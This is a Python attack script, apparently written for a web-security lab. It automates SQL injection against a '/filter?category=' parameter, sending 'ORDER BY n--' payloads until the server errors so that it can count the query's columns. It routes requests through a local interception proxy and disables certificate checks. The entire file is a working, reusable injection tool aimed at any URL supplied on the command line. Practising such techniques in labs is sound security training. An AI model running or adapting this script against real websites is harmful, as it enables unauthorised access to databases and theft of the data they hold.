#!/usr/bin/python3
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080' }
def exploit_sqli_column_number(url):
	path = "/filter?category="+category
	for i in range(1,50):
		sql_payload = "'+order+by+%s-- " %i
		print ("[+] Trying a value of "+str(i)+"...", end =" ")
		r = requests.get(url + path+ sql_payload, verify=False, proxies=proxies)
		#res = r.text
		status = r.status_code
		print("Status: "+str(status))
		if status >= 500:
			return i-1
		i = i+1
	return False	

if __name__=="__main__":
	try:
		url = sys.argv[1].strip()
		category = sys.argv[2].strip()
	except IndexError:
		print("[-] Usage: %s <url> <category>" % sys.argv[0])
		print("[-] Example: %s www.example.com \"pets\"" % sys.argv[0])
		sys.exit (-1)
		
	print ("[+] Figuring out number of columns...")
	num_col = exploit_sqli_column_number(url)
	if num_col:
		print("[+] The number of Columns is " +str(num_col)+".")
	else:
		print("[+] Not succesful")
